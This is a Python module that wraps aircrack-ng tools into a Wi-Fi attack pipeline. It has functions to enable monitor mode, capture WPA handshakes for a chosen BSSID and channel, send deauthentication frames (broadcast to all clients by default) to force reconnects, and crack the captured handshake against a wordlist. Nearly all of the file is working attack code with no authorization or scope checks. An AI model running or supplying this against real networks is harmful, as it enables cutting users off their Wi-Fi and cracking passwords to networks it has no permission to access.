import subprocess
import shlex
from typing import Optional
import time


def run_cmd(cmd: str, on_line=None):
    proc = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in proc.stdout:
        if on_line:
            on_line(line.rstrip())
    proc.wait()
    return proc.returncode


def start_monitor(interface: str, on_line=None) -> int:
    return run_cmd(f"sudo airmon-ng start {interface}", on_line)


def stop_monitor(interface: str, on_line=None) -> int:
    return run_cmd(f"sudo airmon-ng stop {interface}", on_line)


def capture_handshake(interface_mon: str, bssid: str, channel: int, output_cap: str, on_line=None) -> int:
    cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_cap} {interface_mon}"
    return run_cmd(cmd, on_line)


def deauth_attack(interface_mon: str, bssid: str, client_mac: Optional[str], count: int = 10, on_line=None) -> int:
    target = client_mac or 'FF:FF:FF:FF:FF:FF'
    cmd = f"sudo aireplay-ng --deauth {count} -a {bssid} -c {target} {interface_mon}"
    return run_cmd(cmd, on_line)


def crack_handshake(cap_file: str, wordlist: str, on_line=None) -> int:
    cmd = f"aircrack-ng -w {wordlist} {cap_file}"
    return run_cmd(cmd, on_line)


def capture_handshake_timeout(interface_mon: str, bssid: str, channel: int, output_cap: str, seconds: int, on_line=None) -> int:
    proc = subprocess.Popen(shlex.split(f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_cap} {interface_mon}"), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    start = time.time()
    while True:
        line = proc.stdout.readline()
        if not line:
            break
        if on_line:
            on_line(line.rstrip())
        if time.time() - start > seconds:
            try:
                proc.terminate()
            except Exception:
                pass
            break
    proc.wait()
    return proc.returncode
